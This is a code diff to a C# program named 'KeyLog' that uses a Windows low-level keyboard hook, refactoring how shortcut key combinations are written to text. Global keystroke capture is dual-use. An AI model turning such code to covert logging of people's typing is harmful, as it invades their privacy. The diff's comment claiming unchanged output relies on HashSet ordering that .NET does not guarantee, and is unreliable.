@@ -78,7 +78,6 @@ namespace KeyLog
             }
         }
 
-
         private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
 
         // used to store key sequences
@@ -140,15 +139,11 @@ namespace KeyLog
             if (!(buffer.Contains(Keys.LControlKey) && buffer.Contains(Keys.RMenu)) && buffer.Any(x => bypassKeys.Contains(x)))
             {
                 //this is a shortcut or a special key   
-                List<Keys> lst = new List<Keys>();
-                foreach (var item in buffer)
-                {
-                    if (!lst.Contains(item))
-                    {
-                        lst.Add(item);
-                        result.Append($"{item} ");
-                    }
-                }
+                var hashSet = new HashSet<Keys>(buffer);
+                // lst used to have a trailing space, so the following line should not differ from the previous output
+                result.Append(string.Concat(hashSet.Select(x => $"{x} ")));
+                // but this one would:
+                // result.Append(string.Join(" ", hashSet));
                 isShortcut = true;
             }
             else
